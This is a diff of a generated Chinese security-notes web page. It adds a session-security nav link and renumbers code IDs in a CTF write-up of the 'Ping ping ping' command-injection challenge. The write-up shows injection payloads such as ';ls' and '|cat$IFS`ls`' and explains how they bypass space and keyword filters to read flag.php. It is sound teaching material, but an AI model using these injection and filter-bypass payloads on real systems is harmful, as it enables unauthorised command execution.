@@ -1729,6 +1729,8 @@
       
         
       
+        
+      
     
     
     
@@ -1854,6 +1856,36 @@
     
   
     代码执行
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E4%BC%9A%E8%AF%9D%E5%AE%89%E5%85%A8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    会话安全
   
 
     
@@ -2448,29 +2480,29 @@
     <h2 id="ping-ping-ping-flag"><a class="toclink" href="../../ping-ping-ping/">[Ping ping ping] 空格被过滤后怎么读 flag</a></h2>
 <p>第一道命令注入题。输入框是 ping 测试。</p>
 <h3 id="_1"><a class="toclink" href="../../ping-ping-ping/#_1">现象</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>127.0.0.1;id      → 没反应
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>127.0.0.1;id      → 没反应
 </span></code></pre></div>
 <p><strong>试出空格被过滤。</strong></p>
 <h3 id="_2"><a class="toclink" href="../../ping-ping-ping/#_2">绕法</a></h3>
 <p><strong>空格 → <code>$IFS</code></strong></p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">;</span>ls<span class="w">          </span>→<span class="w"> </span>看见<span class="w"> </span>flag.php
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">;</span>ls<span class="w">          </span>→<span class="w"> </span>看见<span class="w"> </span>flag.php
 </span></code></pre></div>
 <p><strong>但 <code>flag</code> 这个词也被过滤，<code>/</code> 和 <code>/f*</code> 同样被拦。</strong></p>
 <h3 id="_3"><a class="toclink" href="../../ping-ping-ping/#_3">关键一步：让系统自己算文件名</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">|</span>cat<span class="nv">$IFS</span><span class="sb">`</span>ls<span class="sb">`</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">|</span>cat<span class="nv">$IFS</span><span class="sb">`</span>ls<span class="sb">`</span>
 </span></code></pre></div>
 <p><strong>拆开看：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>|            管道
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>cat          要执行的命令
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>$IFS         空格
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>`ls`         命令替换 → 得到 "flag.php"
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>             ↓
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>最终等价于:  cat flag.php
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>|            管道
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>cat          要执行的命令
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>$IFS         空格
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>`ls`         命令替换 → 得到 "flag.php"
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>             ↓
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>最终等价于:  cat flag.php
 </span></code></pre></div>
 <p><strong>拿到了 flag。</strong></p>
 <h3 id="_4"><a class="toclink" href="../../ping-ping-ping/#_4">为什么这招有效</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>flag 被拦   →  不写 flag 这个字面量
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>/ 和 /f* 被拦 →  路径里的 / 也不用写
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>flag 被拦   →  不写 flag 这个字面量
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>/ 和 /f* 被拦 →  路径里的 / 也不用写
 </span></code></pre></div>
 <p><strong>让系统输出文件名，再用命令替换塞进参数里 —— 你一个字都不用写。</strong></p>
 <h3 id="_5"><a class="toclink" href="../../ping-ping-ping/#_5">踩的坑</a></h3>
